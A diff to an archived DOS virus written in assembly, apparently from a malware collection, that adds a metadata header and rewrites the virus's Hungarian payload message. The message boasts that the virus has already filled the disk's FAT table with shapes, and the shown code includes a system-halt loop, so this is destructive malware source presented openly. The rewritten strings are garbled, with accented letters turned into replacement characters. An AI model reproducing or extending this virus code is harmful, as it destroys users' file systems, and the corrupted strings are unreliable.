@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      V
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 start	segment
 	assume cs:start,ds:start
 	org	100h
@@ -1186,10 +1197,10 @@ awqt:	mov	al,cs:[si]
 kie:	cli
 	hlt
 	jmp	kie
-kiiras:	db	'   Haha,v¡rus van a g‚pben!!',0dh,0ah,'Ez egy eddig m‚g nem k”zismert v¡rus. De hamarosan az lesz.'
-	db	0dh,0ah,'A neve egyszeren t”lt”get” ',0dh,0ah,'Ezt a nev‚t onnan kapta, hogy'
-	db	' felt”lt”geti a FAT-t bl t k”l”nb”z” alakzatokkal.',0dh,0ah
-	db	'Ez m r meg is t”rt‚nt !!! ',0dh,0ah,0,0
+kiiras:	db	'   Haha,vï¿½rus van a gï¿½pben!!',0dh,0ah,'Ez egy eddig mï¿½g nem kï¿½zismert vï¿½rus. De hamarosan az lesz.'
+	db	0dh,0ah,'A neve egyszerï¿½en tï¿½ltï¿½getï¿½ ',0dh,0ah,'Ezt a nevï¿½t onnan kapta, hogy'
+	db	' feltï¿½ltï¿½geti a FAT-tï¿½blï¿½t kï¿½lï¿½nbï¿½zï¿½ alakzatokkal.',0dh,0ah
+	db	'Ez mï¿½r meg is tï¿½rtï¿½nt !!! ',0dh,0ah,0,0
 graf:	db	32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32
 	db	32,01,01,01,01,01,01,32,32,01,01,01,01,01,01,32
 	db	01,32,32,32,32,32,32,01,01,32,32,32,32,32,32,01
